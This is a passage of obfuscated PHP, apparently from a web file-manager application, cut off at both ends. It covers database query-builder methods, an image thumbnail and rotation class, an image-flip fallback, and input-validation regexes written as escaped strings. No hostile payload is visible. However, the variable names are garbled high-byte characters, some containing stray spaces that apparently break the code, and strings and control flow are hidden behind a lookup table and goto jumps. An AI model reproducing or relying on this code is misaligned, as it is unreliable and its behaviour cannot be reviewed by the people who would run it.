$Aï¿É±¸×) { if (!isset($this->_scope[$Aï¿É±¸×])) { continue; } $eì‹ÄÓí”Â = array_merge($eì‹ÄÓí”Â, $this->_scope[$Aï¿É±¸×]); } if (!empty($C°Ÿ›ÁÎÒ™) && is_array($C°Ÿ›ÁÎÒ™)) { $eì‹ÄÓí”Â = array_merge($eì‹ÄÓí”Â, $C°Ÿ›ÁÎÒ™); } } elseif (is_array($AÏ‡¨Á ºŒ)) { $eì‹ÄÓí”Â = $AÏ‡¨Á ºŒ; } if (is_array($eì‹ÄÓí”Â) && !empty($eì‹ÄÓí”Â)) { $this->options = array_merge($this->options, array_change_key_case($eì‹ÄÓí”Â)); } return $this; } public function where($EÔ—¾“²¿È, $b»°Ğáã×ä = null) { $Cá‰æ¶îƒø =& $_SERVER[¬ˆÚÂ”Éğä]; if (!is_null($b»°Ğáã×ä) && is_string($EÔ—¾“²¿È)) { if (!is_array($b»°Ğáã×ä)) { $b»°Ğáã×ä = func_get_args(); array_shift($b»°Ğáã×ä); } $b»°Ğáã×ä = array_map(array($this->db, $Cá‰æ¶îƒø[331]), $b»°Ğáã×ä); $EÔ—¾“²¿È = vsprintf($EÔ—¾“²¿È, $b»°Ğáã×ä); } elseif (is_object($EÔ—¾“²¿È)) { $EÔ—¾“²¿È = get_object_vars($EÔ—¾“²¿È); } elseif (is_array($EÔ—¾“²¿È)) { foreach ($EÔ—¾“²¿È as $A‡œØÑî§ => $e×˜¢åÍ) { if ((is_numeric($A‡œØÑî§) || !$A‡œØÑî§) && is_string($e×˜¢åÍ)) { think_trace($Cá‰æ¶îƒø[338], $Cá‰æ¶îƒø[33], $Cá‰æ¶îƒø[46]); die; } } } if (is_string($EÔ—¾“²¿È) && $Cá‰æ¶îƒø[33] != $EÔ—¾“²¿È) { $Aœ¿²Â‡¹ç = array(); $Aœ¿²Â‡¹ç[$Cá‰æ¶îƒø[339]] = $EÔ—¾“²¿È; $EÔ—¾“²¿È = $Aœ¿²Â‡¹ç; } if (isset($this->options[$Cá‰æ¶îƒø[263]])) { $this->options[$Cá‰æ¶îƒø[263]] = array_merge($this->options[$Cá‰æ¶îƒø[263]], $EÔ—¾“²¿È); } else { $this->options[$Cá‰æ¶îƒø[263]] = $EÔ—¾“²¿È; } return $this; } public function limit($F·‡Å²¾Ûº, $FËãø¥·Ö = null) { $CìÇÚ·æ² =& $_SERVER[¬ˆÚÂ”Éğä]; $this->options[$CìÇÚ·æ²[280]] = is_null($FËãø¥·Ö) ? $F·‡Å²¾Ûº : $F·‡Å²¾Ûº . $CìÇÚ·æ²[47] . $FËãø¥·Ö; return $this; } public function page($A‹ÙƒõÃ…‘, $Bß×Şóçƒ¨ = null) { $bÄ¹óÙÙº =& $_SERVER[¬ˆÚÂ”Éğä]; $this->options[$bÄ¹óÙÙº[340]] = is_null($Bß×Şóçƒ¨) ? $A‹ÙƒõÃ…‘ : $A‹ÙƒõÃ…‘ . $bÄ¹óÙÙº[47] . $Bß×Şóçƒ¨; return $this; } public function comment($dëÏô•ô») { $this->options[$_SERVER[¬ˆÚÂ”Éğä][341]] = $dëÏô•ô»; return $this; } public function setProperty($CùÑË¤Ë÷å, $B±ÅšÙÆÊ) { if (property_exists($this, $CùÑË¤Ë÷å)) { $this->{$CùÑË¤Ë÷å} = $B±ÅšÙÆÊ; } return $this; } } goto aàŞĞÒ—™ã; eË¥°†ˆß: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($fùÊ¨“øŸ«, $F‰ÀìÓ™˜ƒ) { goto Aòï•°œæÊ; DÏ¶‚™ˆÇğ: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto Eˆ±Ü¹‚ÖŒ; eˆİÍàÔÄğ: if (!$this->im) { return !1; } $bôÙ¢Ãˆç³ = $_SERVER[¬ˆÚÂ”Éğä][33]; $this->imgData = GetImageSize($fùÊ¨“øŸ«, $bôÙ¢Ãˆç³); goto DÏ¶‚™ˆÇğ; Aòï•°œæÊ: $this->srcFile = $fùÊ¨“øŸ«; $this->echoType = $F‰ÀìÓ™˜ƒ; $this->im = self::image($fùÊ¨“øŸ«); goto eˆİÍàÔÄğ; Eˆ±Ü¹‚ÖŒ: } public static function image($A§—‚Äİ½) { $DˆéÁÒ¿—ƒ =& $_SERVER[¬ˆÚÂ”Éğä]; $A»†ÏóšŞ = $DˆéÁÒ¿—ƒ[33]; $aÖå‘²ÍéÍ = GetImageSize($A§—‚Äİ½, $A»†ÏóšŞ); $f£öñ…×…— = !1; switch ($aÖå‘²ÍéÍ[2]) { case IMAGETYPE_GIF: if (!function_exists($DˆéÁÒ¿—ƒ[1878])) { break; } $f£öñ…×…— = imagecreatefromgif($A§—‚Äİ½); break; case IMAGETYPE_JPEG: if (!function_exists($DˆéÁÒ¿—ƒ[1879])) { break; } $f£öñ…×…— = imagecreatefromjpeg($A§—‚Äİ½); break; case IMAGETYPE_PNG: if (!function_exists($DˆéÁÒ¿—ƒ[1880])) { break; } $f£öñ…×…— = @imagecreatefrompng($A§—‚Äİ½); imagesavealpha($f£öñ…×…—, !0); break; case IMAGETYPE_XBM: $f£öñ…×…— = imagecreatefromxbm($A§—‚Äİ½); break; case IMAGETYPE_WBMP: $f£öñ…×…— = imagecreatefromwbmp($A§—‚Äİ½); break; case IMAGETYPE_BMP: $f£öñ…×…— = imagecreatefrombmp($A§—‚Äİ½); break; default: break; } return $f£öñ…×…—; } public static function imageSize($D–­³Ú÷¸Ã) { $eø¿ù®ÏŸ« =& $_SERVER[¬ˆÚÂ”Éğä]; $B…Ô±ï‘¾  = GetImageSize($D–­³Ú÷¸Ã); if (!$B…Ô±ï‘¾ ) { return !1; } return array($eø¿ù®ÏŸ«[1881] => $B…Ô±ï‘¾ [0], $eø¿ù®ÏŸ«[1882] => $B…Ô±ï‘¾ [1]); } function distortion($E˜„Û¢—ßø, $Eåˆ¿÷—Í, $EÓ˜ÈŸÜÙÂ) { $b´ÜÖª›®ô = $this->creatImage($this->im, $Eåˆ¿÷—Í, $EÓ˜ÈŸÜÙÂ, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($b´ÜÖª›®ô, $E˜„Û¢—ßø); } function prorate($dƒøæá¬ª, $d„…âğÌ×´, $C¡µÄ²Ã’±) { $eœÕÛØ–´£ = $d„…âğÌ×´ / $C¡µÄ²Ã’±; $DµÖ”ÆÄ ´ = $this->srcW / $this->srcH; if ($eœÕÛØ–´£ <= $DµÖ”ÆÄ ´) { $eñ’öŠª  = $d„…âğÌ×´; $DŞÙ¤¦å¥ğ = $eñ’öŠª  * ($this->srcH / $this->srcW); } else { $DŞÙ¤¦å¥ğ = $C¡µÄ²Ã’±; $eñ’öŠª  = $DŞÙ¤¦å¥ğ * ($this->srcW / $this->srcH); } if ($this->srcW > $d„…âğÌ×´ || $this->srcH > $C¡µÄ²Ã’±) { $E‚ÚØßô± = $this->creatImage($this->im, $eñ’öŠª , $DŞÙ¤¦å¥ğ, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $E‚ÚØßô± = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $E‚ÚØßô± = $this->autoRotate($E‚ÚØßô±); return $this->echoImage($E‚ÚØßô±, $dƒøæá¬ª); } private function autoRotate($e¥¨‚Úí‡£) { goto BÃŸƒ‡¦·; aÃó†‘´÷¥: if (!$BŠ‹ÜÇíÍè || !isset($BŠ‹ÜÇíÍè[$F ÊÑÏÕâù[1884]]) || $BŠ‹ÜÇíÍè[$F ÊÑÏÕâù[1884]] == 1) { return $e¥¨‚Úí‡£; } $EÊ®Î¿¸Ø¯ = 0; if ($BŠ‹ÜÇíÍè[$F ÊÑÏÕâù[1884]] == 6) { $EÊ®Î¿¸Ø¯ = 90; } goto Aœù¬–ß¬Û; BÃŸƒ‡¦·: $F ÊÑÏÕâù =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$e¥¨‚Úí‡£ || !function_exists($F ÊÑÏÕâù[1883])) { return $e¥¨‚Úí‡£; } $BŠ‹ÜÇíÍè = exif_read_data($this->srcFile); goto aÃó†‘´÷¥; Aœù¬–ß¬Û: if ($BŠ‹ÜÇíÍè[$F ÊÑÏÕâù[1884]] == 8) { $EÊ®Î¿¸Ø¯ = 270; } if ($BŠ‹ÜÇíÍè[$F ÊÑÏÕâù[1884]] == 3) { $EÊ®Î¿¸Ø¯ = 180; } return $this->rotateDegree($e¥¨‚Úí‡£, $EÊ®Î¿¸Ø¯); goto CÌÓ·òó¹ö; CÌÓ·òó¹ö: } private function rotateDegree($E©¤ê»· , $bŠå·à¬É³) { if (!$E©¤ê»·  || $bŠå·à¬É³ % 360 === 0 || !function_exists($_SERVER[¬ˆÚÂ”Éğä][1885])) { return $E©¤ê»· ; } $eÈ›§ù‰è = imageRotate($E©¤ê»· , 360 - $bŠå·à¬É³, 0); imageDestroy($E©¤ê»· ); return $eÈ›§ù‰è ? $eÈ›§ù‰è : $E©¤ê»· ; } function cut($e×ÕÚ÷âæ•, $CÖäŠğ›»Ü, $c÷éä…©ˆ) { goto bª˜¨ÉŸµ; d‡ïíßæ‡†: return $this->echoImage($C™Ò™†öÁ¸, $e×ÕÚ÷âæ•); goto A‚ëÈä¼Ÿ; bª˜¨ÉŸµ: $FªÂ¶ïÁ  = $CÖäŠğ›»Ü / $c÷éä…©ˆ; $Bã—ğãÈ‚¢ = $this->srcW / $this->srcH; if ($FªÂ¶ïÁ  <= $Bã—ğãÈ‚¢) { $e¼ç“¿¾‘¡ = $c÷éä…©ˆ; $C‡ªœªœƒ = $e¼ç“¿¾‘¡ * ($this->srcW / $this->srcH); } else { $C‡ªœªœƒ = $CÖäŠğ›»Ü; $e¼ç“¿¾‘¡ = $C‡ªœªœƒ * ($this->srcH / $this->srcW); } goto DÏ“÷Ô÷®Œ; DÏ“÷Ô÷®Œ: $e’¨ƒÒÃ¨… = $this->creatImage($this->im, $C‡ªœªœƒ, $e¼ç“¿¾‘¡, 0, 0, 0, 0, $this->srcW, $this->srcH); $C™Ò™†öÁ¸ = $this->creatImage($e’¨ƒÒÃ¨…, $CÖäŠğ›»Ü, $c÷éä…©ˆ, 0, 0, ($C‡ªœªœƒ - $CÖäŠğ›»Ü) / 2, ($e¼ç“¿¾‘¡ - $c÷éä…©ˆ) / 2, $CÖäŠğ›»Ü, $c÷éä…©ˆ); imageDestroy($e’¨ƒÒÃ¨…); goto d‡ïíßæ‡†; A‚ëÈä¼Ÿ: } function backFill($e‡²è‘Ù©®, $d—å–ùÅŠ, $d’‰£Ñ°°Æ, $Fƒ ÇÚÕ = false, $AÏåÂ²Ú¿· = 255, $B†ÖíÉù”‡ = 255, $d´àÈëœ¹” = 255) { goto Bˆí‹“‚”²; eŒÏ¡Ú…Ö: if (function_exists($_SERVER[¬ˆÚÂ”Éğä][1886])) { @($a³ÒÖ½·Òì = imageCreateTrueColor($d—å–ùÅŠ, $d’‰£Ñ°°Æ)); if (!$a³ÒÖ½·Òì) { $a³ÒÖ½·Òì = imageCreate($d—å–ùÅŠ, $d’‰£Ñ°°Æ); } } else { $a³ÒÖ½·Òì = imageCreate($d—å–ùÅŠ, $d’‰£Ñ°°Æ); } $E¡ÑŸÎÙ¥ = ($d’‰£Ñ°°Æ - $dˆ™Á‘¬­Â) / 2; $eÍ©Ğšœ£ = imagecolorallocate($a³ÒÖ½·Òì, $AÏåÂ²Ú¿·, $B†ÖíÉù”‡, $d´àÈëœ¹”); goto CÔ¹ ×‹‹; aö…Êçğˆ‹: return $this->echoImage($a³ÒÖ½·Òì, $e‡²è‘Ù©®); goto aÖ‡êÄŒ; CÔ¹ ×‹‹: if ($Fƒ ÇÚÕ) { $eÍ©Ğšœ£ = imageColorTransparent($a³ÒÖ½·Òì, $eÍ©Ğšœ£); $E¡ÑŸÎÙ¥ = $d’‰£Ñ°°Æ - $dˆ™Á‘¬­Â; } imageFilledRectangle($a³ÒÖ½·Òì, 0, 0, $d—å–ùÅŠ, $d’‰£Ñ°°Æ, $eÍ©Ğšœ£); if ($this->srcW > $d—å–ùÅŠ || $this->srcH > $d’‰£Ñ°°Æ) { $e½¿Š¡‰±¾ = $this->creatImage($this->im, $AÂ‰¢ôØíŠ, $dˆ™Á‘¬­Â, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($AÂ‰¢ôØíŠ < $d—å–ùÅŠ) { imageCopy($a³ÒÖ½·Òì, $e½¿Š¡‰±¾, ($d—å–ùÅŠ - $AÂ‰¢ôØíŠ) / 2, 0, 0, 0, $AÂ‰¢ôØíŠ, $dˆ™Á‘¬­Â); } else { if ($dˆ™Á‘¬­Â < $d’‰£Ñ°°Æ) { imageCopy($a³ÒÖ½·Òì, $e½¿Š¡‰±¾, 0, $E¡ÑŸÎÙ¥, 0, 0, $AÂ‰¢ôØíŠ, $dˆ™Á‘¬­Â); } else { imageCopy($a³ÒÖ½·Òì, $e½¿Š¡‰±¾, 0, 0, 0, 0, $AÂ‰¢ôØíŠ, $dˆ™Á‘¬­Â); } } } else { imageCopyMerge($a³ÒÖ½·Òì, $this->im, ($d—å–ùÅŠ - $AÂ‰¢ôØíŠ) / 2, $E¡ÑŸÎÙ¥, 0, 0, $AÂ‰¢ôØíŠ, $dˆ™Á‘¬­Â, 100); } goto aö…Êçğˆ‹; Bˆí‹“‚”²: $F¡½¨‰£½Ş = $d—å–ùÅŠ / $d’‰£Ñ°°Æ; $eî¼¥Òï† = $this->srcW / $this->srcH; if ($F¡½¨‰£½Ş <= $eî¼¥Òï†) { $AÂ‰¢ôØíŠ = $d—å–ùÅŠ; $dˆ™Á‘¬­Â = $AÂ‰¢ôØíŠ * ($this->srcH / $this->srcW); } else { $dˆ™Á‘¬­Â = $d’‰£Ñ°°Æ; $AÂ‰¢ôØíŠ = $dˆ™Á‘¬­Â * ($this->srcW / $this->srcH); } goto eŒÏ¡Ú…Ö; aÖ‡êÄŒ: } function creatImage($DÓè±šï·, $FÚ®–ªÔ§, $BèÍ¸¥ëÛ™, $d“ù’õ·İ, $c»øó¤¤ê, $f·Ã…àƒª, $C½·‚÷‰íÄ, $cÚ£¥ºáÇå, $cË„×Æ ¥à) { if (function_exists($_SERVER[¬ˆÚÂ”Éğä][1886])) { @($AÂ¯ßœÅ·® = ImageCreateTrueColor($FÚ®–ªÔ§, $BèÍ¸¥ëÛ™)); @imagealphablending($AÂ¯ßœÅ·®, !1); @imagesavealpha($AÂ¯ßœÅ·®, !0); if ($AÂ¯ßœÅ·®) { imageCopyResampled($AÂ¯ßœÅ·®, $DÓè±šï·, $d“ù’õ·İ, $c»øó¤¤ê, $f·Ã…àƒª, $C½·‚÷‰íÄ, $FÚ®–ªÔ§, $BèÍ¸¥ëÛ™, $cÚ£¥ºáÇå, $cË„×Æ ¥à); } else { $AÂ¯ßœÅ·® = ImageCreate($FÚ®–ªÔ§, $BèÍ¸¥ëÛ™); imageCopyResized($AÂ¯ßœÅ·®, $DÓè±šï·, $d“ù’õ·İ, $c»øó¤¤ê, $f·Ã…àƒª, $C½·‚÷‰íÄ, $FÚ®–ªÔ§, $BèÍ¸¥ëÛ™, $cÚ£¥ºáÇå, $cË„×Æ ¥à); } } else { $AÂ¯ßœÅ·® = ImageCreate($FÚ®–ªÔ§, $BèÍ¸¥ëÛ™); imageCopyResized($AÂ¯ßœÅ·®, $DÓè±šï·, $d“ù’õ·İ, $c»øó¤¤ê, $f·Ã…àƒª, $C½·‚÷‰íÄ, $FÚ®–ªÔ§, $BèÍ¸¥ëÛ™, $cÚ£¥ºáÇå, $cË„×Æ ¥à); } return $AÂ¯ßœÅ·®; } public function imgRotate($D¢´èØ„ã¦, $aŠéÍ„ÚÆÓ) { goto E¤ÆŠÏ‡ÇÈ; E¤ÆŠÏ‡ÇÈ: if (!$this->im || $aŠéÍ„ÚÆÓ % 360 === 0 || !function_exists($_SERVER[¬ˆÚÂ”Éğä][1885])) { return !1; } $A‘šØ¬›‚÷ = imageRotate($this->im, 360 - $aŠéÍ„ÚÆÓ, 0); $AÇÅìÉÍ¾š = !1; goto f¨ó„¢½÷; f¨ó„¢½÷: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $AÇÅìÉÍ¾š = imagegif($A‘šØ¬›‚÷, $D¢´èØ„ã¦); break; case IMAGETYPE_JPEG: $AÇÅìÉÍ¾š = imagejpeg($A‘šØ¬›‚÷, $D¢´èØ„ã¦, 100); break; case IMAGETYPE_PNG: $AÇÅìÉÍ¾š = imagePNG($A‘šØ¬›‚÷, $D¢´èØ„ã¦); break; default: break; } imageDestroy($A‘šØ¬›‚÷); imageDestroy($this->im); goto AÜÙà–Ü¡µ; AÜÙà–Ü¡µ: return $AÇÅìÉÍ¾š; goto E›ôª¡İ«Å; E›ôª¡İ«Å: } function echoImage($DùÕÚ›«”, $B„˜Š¬òÀ) { goto EŒ¤¹‘›¦; AÇ¯ìÔ±š³: imageDestroy($this->im); return $A‘³ÔêŒ´; goto bÁõˆÛóèÍ; EŒ¤¹‘›¦: $fÈ‡Ãíº„â =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$DùÕÚ›«”) { return !1; } ob_get_clean(); goto Cµ½›×Œâ™; Cµ½›×Œâ™: $A‘³ÔêŒ´ = !1; switch ($this->echoType) { case $fÈ‡Ãíº„â[1887]: $A‘³ÔêŒ´ = imagePNG($DùÕÚ›«”); break; case $fÈ‡Ãíº„â[167]: $A‘³ÔêŒ´ = imagePNG($DùÕÚ›«”, $B„˜Š¬òÀ); break; } imageDestroy($DùÕÚ›«”); goto AÇ¯ìÔ±š³; bÁõˆÛóèÍ: } } if (!function_exists($_SERVER[¬ˆÚÂ”Éğä][1888])) { define($_SERVER[¬ˆÚÂ”Éğä][1889], 0); define($_SERVER[¬ˆÚÂ”Éğä][1890], 1); define($_SERVER[¬ˆÚÂ”Éğä][1891], 2); function imageflip($D„†îåâËÛ, $BÄå‚ˆÉòå) { switch ($BÄå‚ˆÉòå) { case IMG_FLIP_HORIZONTAL: $aÇÚÚƒÁˆ¢ = imagesx($D„†îåâËÛ) - 1; $fôº£¥«Ì· = $aÇÚÚƒÁˆ¢ / 2; $f’Í¤ª»éÇ = imagesy($D„†îåâËÛ); $Fè‚Ã¹ä¹ = imageistruecolor($D„†îåâËÛ) ? imagecreatetruecolor(1, $f’Í¤ª»éÇ) : imagecreate(1, $f’Í¤ª»éÇ); for ($FôéŒŠİÓ” = 0; $FôéŒŠİÓ” < $fôº£¥«Ì·; ++$FôéŒŠİÓ”) { imagecopy($Fè‚Ã¹ä¹, $D„†îåâËÛ, 0, 0, $FôéŒŠİÓ”, 0, 1, $f’Í¤ª»éÇ); imagecopy($D„†îåâËÛ, $D„†îåâËÛ, $FôéŒŠİÓ”, 0, $aÇÚÚƒÁˆ¢ - $FôéŒŠİÓ”, 0, 1, $f’Í¤ª»éÇ); imagecopy($D„†îåâËÛ, $Fè‚Ã¹ä¹, $aÇÚÚƒÁˆ¢ - $FôéŒŠİÓ”, 0, 0, 0, 1, $f’Í¤ª»éÇ); } break; case IMG_FLIP_VERTICAL: $A‘Ôë‡Ş÷‘ = imagesx($D„†îåâËÛ); $a¼ÈÜ–Ù = imagesy($D„†îåâËÛ) - 1; $f±Û‰‰ìøá = $a¼ÈÜ–Ù / 2; $Fè‚Ã¹ä¹ = imageistruecolor($D„†îåâËÛ) ? imagecreatetruecolor($A‘Ôë‡Ş÷‘, 1) : imagecreate($A‘Ôë‡Ş÷‘, 1); for ($C×‚¯ôÍ•Ê = 0; $C×‚¯ôÍ•Ê < $f±Û‰‰ìøá; ++$C×‚¯ôÍ•Ê) { imagecopy($Fè‚Ã¹ä¹, $D„†îåâËÛ, 0, 0, 0, $C×‚¯ôÍ•Ê, $A‘Ôë‡Ş÷‘, 1); imagecopy($D„†îåâËÛ, $D„†îåâËÛ, 0, $C×‚¯ôÍ•Ê, 0, $a¼ÈÜ–Ù - $C×‚¯ôÍ•Ê, $A‘Ôë‡Ş÷‘, 1); imagecopy($D„†îåâËÛ, $Fè‚Ã¹ä¹, 0, $a¼ÈÜ–Ù - $C×‚¯ôÍ•Ê, 0, 0, $A‘Ôë‡Ş÷‘, 1); } break; case IMG_FLIP_BOTH: $A‘Ôë‡Ş÷‘ = imagesx($D„†îåâËÛ); $f’Í¤ª»éÇ = imagesy($D„†îåâËÛ); $Fè‚Ã¹ä¹ = imagerotate($D„†îåâËÛ, 180, 0); imagecopy($D„†îåâËÛ, $Fè‚Ã¹ä¹, 0, 0, 0, 0, $A‘Ôë‡Ş÷‘, $f’Í¤ª»éÇ); break; default: return; } imagedestroy($Fè‚Ã¹ä¹); } } if (!function_exists($_SERVER[¬ˆÚÂ”Éğä][1892])) { function imagecreatefrombmp($BÕ‚ˆöæÙ‰) { return ImageGdBMP::load($BÕ‚ˆöæÙ‰); } } goto e½ŞËÚğæ›; D®¢ìíÜ’: function beforeShutdown() { Hook::trigger($_SERVER[í][32]); } $_SERVER[$_SERVER[í][33]] = BASIC_PATH; $_SERVER[$_SERVER[í][34]] = LIB_DIR; goto Cõóê™Ö¦±; e½ŞËÚğæ›: class Input { public static function getArray($D±¨šØ”“) { goto E»ëˆ¿½æÖ; Cöëïƒ’: $cĞÁ‰æé•» = array(); $f¨Ş˜Š†¿ = LNG($b‰ÔÙ¦‰Ÿ[1893]); foreach ($D±¨šØ”“ as $dÇÍ±Î§Ú => $aÃ—ŞÒê£§) { goto D»âÇ‡Õ¾÷; D»âÇ‡Õ¾÷: $Däùò†´¼Š = _get($aÃ—ŞÒê£§, $b‰ÔÙ¦‰Ÿ[1259], $f¨Ş˜Š†¿ . $b‰ÔÙ¦‰Ÿ[892] . $dÇÍ±Î§Ú); $bªœ˜é¹¿Ş = $dÇÍ±Î§Ú; if (isset($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1894]]) && $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1894]]) { $bªœ˜é¹¿Ş = $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1894]]; } goto Eù…ÖµÇòÀ; fÎ­ÖØß¿¿: if (isset($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1896]]) && !self::check($in[$dÇÍ±Î§Ú], $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1896]], $E²ë¢­îåè)) { if (array_key_exists($b‰ÔÙ¦‰Ÿ[1895], $aÃ—ŞÒê£§)) { if (!is_null($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]])) { $a±Œô…½Š¯[$bªœ˜é¹¿Ş] = $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]]; } } else { $cĞÁ‰æé•»[] = $Däùò†´¼Š; } continue; } $a±Œô…½Š¯[$bªœ˜é¹¿Ş] = $in[$dÇÍ±Î§Ú]; goto f½·ÅÇ··; Eù…ÖµÇòÀ: if (!array_key_exists($dÇÍ±Î§Ú, $in)) { if (array_key_exists($b‰ÔÙ¦‰Ÿ[1895], $aÃ—ŞÒê£§)) { if (!is_null($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]])) { $a±Œô…½Š¯[$bªœ˜é¹¿Ş] = $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]]; } } else { if (isset($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1896]])) { $cĞÁ‰æé•»[] = $Däùò†´¼Š; } } continue; } if (isset($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1896]]) && $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1896]] == $b‰ÔÙ¦‰Ÿ[282]) { $bµ›‘Ğ†ÆŠ = json_decode($in[$dÇÍ±Î§Ú], !0); if (is_array($bµ›‘Ğ†ÆŠ)) { $a±Œô…½Š¯[$bªœ˜é¹¿Ş] = $bµ›‘Ğ†ÆŠ; } else { if (array_key_exists($b‰ÔÙ¦‰Ÿ[1895], $aÃ—ŞÒê£§)) { if (!is_null($aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]])) { $a±Œô…½Š¯[$bªœ˜é¹¿Ş] = $aÃ—ŞÒê£§[$b‰ÔÙ¦‰Ÿ[1895]]; } } else { $cĞÁ‰æé•»[] = $Däùò†´¼Š; } } continue; } $E²ë¢­îåè = _get($aÃ—ŞÒê£§, $b‰ÔÙ¦‰Ÿ[1025]); goto fÎ­ÖØß¿¿; f½·ÅÇ··: } goto AáÀ–ôæ¦; AáÀ–ôæ¦: if (count($cĞÁ‰æé•») > 0) { show_json(implode($b‰ÔÙ¦‰Ÿ[1897], $cĞÁ‰æé•»), !1); } return $a±Œô…½Š¯; goto fÜä±‘ó¥›; E»ëˆ¿½æÖ: $b‰ÔÙ¦‰Ÿ =& $_SERVER[¬ˆÚÂ”Éğä]; global $in; $a±Œô…½Š¯ = array(); goto Cöëïƒ’; fÜä±‘ó¥›: } public static function reg($d†©¨ÖÀ´¨ = "\x72\145\161\x75\x69\x72\145") { static $fÔ‚œ ‡°ê = array("\162\145\161\165\x69\162\x65" => "\56\53", "\x6e\165\x6d\142\x65\x72" => "\x5c\144\x2b", "\151\x6e\164\x65\147\145\x72" => "\134\x64\53", "\x68\x65\170" => "\x5b\60\55\x39\x41\55\106\x61\55\x66\x5d\53", "\151\x6e\x74" => "\133\55\134\53\x5d\x3f\134\x64\x2b", "\142\157\157\154" => "\x30\x7c\61", "\x66\154\x6f\141\x74" => "\x5b\x2d\134\53\x5d\x3f\134\x64\x2b\50\x5c\56\134\144\53\x29\x3f", "\x65\x6e\147\x6c\151\163\x68" => "\x5b\101\55\132\x61\x2d\172\x20\x5d\x2b", "\143\150\151\156\x65\x73\145" => "\x5b\134\170\x7b\x34\x65\60\60\x7d\x2d\x5c\170\x7b\71\x66\x61\65\175\135\x2b", "\150\141\163\103\x68\151\x6e\x65\163\x65" => "\57\50\133\x5c\x78\x7b\x34\145\60\x30\175\x2d\134\170\173\71\x66\x61\65\175\135\53\51\x2f\x75", "\145\x6d\x61\x69\x6c" => "\x5c\167\53\50\x5b\134\x2e\134\55\135\134\167\53\51\x2a\134\x40\x5c\x77\53\50\x5b\x5c\56\x5c\55\135\134\167\53\51\52\x5c\56\134\x77\x2b", "\160\x68\157\x6e\145" => "\61\133\x33\x2d\71\135\134\x64\x7b\x39\175", "\164\145\154\x70\x68\x6f\156\x65" => "\x28\134\50\x5c\144\173\x33\x2c\x34\175\134\51\x7c\134\x64\173\x33\54\64\x7d\55\x7c\134\163\51\x3f\x5c\144\173\67\x2c\61\64\x7d", "\x75\162\x6c" => "\x28\x68\x74\164\x70\x7c\x66\164\160\x7c\x68\x74\164\x70\163\x29\72\134\x2f\134\57\x5b\134\x77\x5c\55\137\x5d\x2b\50\x5c\x2e\x5b\134\167\x5c\x2d\137\x5d\53\x29\53\x28\x5b\x5c\x77\134\55\x5c\56\x2c\100\x3f\136\75\x25\x26\x3a\x5c\57\x7e\134\x2b\43\135\52\133\134\167\134\55\134\x40\77\x5e\x3d\45\x26\x5c\x2f\x7e\134\x2b\x23\x5d\51\77", "\x75\162\x6c\x46\165\154\154" => "\x5b\141\x2d\172\101\x2d\x7a\135\x2b\x3a\134\x2f\134\57\x5b\136\x5c\163\135\52", "\151\x70" => "\50\134\x64\173\61\54\x33\x7d\x5c\x2e\x29\x7b\x33\175\50\134\x64\x7b\61\x2c\x33\x7d\51", "\172\151\160" => "\x5b\x31\x2d\x39\135\x5c\144\x7b\65\x7d\50\77\x21\x5c\x64\51", "\x69\144\x43\141\162\x64" => "\50\x5c\144\x7b\x31\65\175\51\x7c\x28\x5c\x64\173\61\67\x7d\x28\134\x64\x7c\x58\174\170\x29\x29", "\143\x6f\x6c\x6f\162" => "\43\x28\133\x30\55\71\x41\55\106\141\x2d\146\135\x7b\x33\x7d\x7c\x5b\60\x2d\x39\x41\x2d\x46\141\x2d\146\135\173\66\175\x29", "\164\151\155\x65" => "\50\x5b\x30\x2d\61\x5d\x5c\x64\x7c\62\133\x30\x2d\64\135\51\72\x5b\x30\55\x35\135\134\x64", "\x64\x61\x74\145" => "\x5c\x64\x7b\x34\175\133\x2d\x5c\x2f\x5d\x3f\x28\60\x5b\x31\x2d\x39\135\174\61\x5b\60\x2d\x32\x5d\x29\133\55\x5c\x2f\x5d\77\x28\133\x30\x2d\x32\x5d\134\x64\x7c\x33\x5b\x30\x2d\61\x5d\x29", "\x64\x61\x74\145\124\151\x6d\x65" => "\134\144\173\x34\x7d\133\x2d\x5c\57\135\77\50\60\x5b\61\x2d\71\x5d\x7c\61\133\60\55\x32\x5d\x29\x5b\55\134\57\x5d\77\50\133\60\55\62\x5d\x5c\x64\174\x33\x5b\60\55\x31\135\51\x5c\163\x2b\50\133\60\x2d\x31\x5d\134\144\174\62\x5b\60\x2d\x34\135\x29\72\x5b\60\x2d\x35\135\x5c\144", "\x70\x61\163\163\x77\x6f\x72\x64" => "\x28\77\75\x2e\x2a\x5c\x64\51\50\x3f\75\x2e\x2a\x5b\x61\x2d\x7a\x5d\51\x28\77\75\x2e\x2a\x5b\101\x2d\132\x5d\x29\56\x7b\x38\x2c\x32\x30\x7d", "\153\145\x79" => "\x5b\101\55\x5a\x61\x2d\x7a\x30\55\71\137\134\x2d\134\x2e\x5d\x2b", "\x6b\145\x79\x46\165\x6c\x6c" => "\133\101\55\x5a\141\x2d\x7a\x30\55\x39\x5f\x5c\x2d\134\56\x5c\x73\x2c\x5d\53"); if (!$d†©¨ÖÀ´¨) { return $fÔ‚œ ‡°ê; } return $fÔ‚œ ‡°ê[$d†©¨ÖÀ´¨]; } public static function check($d•éµÕŸÕÎ, $DˆÎŸ…‰Çß, 